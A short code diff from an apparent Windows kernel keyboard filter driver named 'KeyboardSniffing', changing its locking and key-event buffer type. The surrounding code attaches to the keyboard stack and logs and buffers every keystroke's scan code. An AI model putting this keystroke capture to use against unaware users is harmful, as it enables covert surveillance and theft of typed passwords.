@@ -1,6 +1,7 @@
 #include "KeyboardSniffing.h"
 #include <ntddkbd.h>
 #include <kstd/memory/New.hpp>
+#include <kstd/synchronization/Spinlock.hpp>
 #include <src/driver/DeviceTypes.h>
 #include <src/utils/logging.h>
 
@@ -11,7 +12,7 @@ void handleKeyboardResponse(PDEVICE_KBFILTER devExt, PIRP Irp)
 	PKEYBOARD_INPUT_DATA keyData = (PKEYBOARD_INPUT_DATA)buf;
 	ULONG count = bytes / sizeof(KEYBOARD_INPUT_DATA);
 
-	kstd::SpinLockGuard guard(devExt->BufferLock);
+	kstd::LockGuard guard(&devExt->BufferLock);
 	for (ULONG i = 0; i < count; ++i) {
 		log("Key[%lu]: MakeCode=0x%X, Flags=0x%X\n", i, keyData[i].MakeCode, keyData[i].Flags);
 		KeyEvent key_data{};
@@ -59,7 +60,7 @@ NTSTATUS attachToKeyboardStack(PDRIVER_OBJECT DriverObject)
 		auto devExt = (PDEVICE_KBFILTER)filterDeviceObject->DeviceExtension;
 		RtlZeroMemory(devExt, sizeof(*devExt));
 		devExt->DeviceType = DeviceType::DEVICE_KBFILTER;
-		new (&devExt->KeyEventBuffer) kstd::CircularBuffer<KeyEvent, KEY_EVENT_BUFFER_SIZE>(true);
+		new (&devExt->KeyEventBuffer) KeyEventBufferType(false);
 		new (&devExt->RemoveLock) kstd::RemoveLock();
 		new (&devExt->BufferLock) kstd::SpinLock();
 
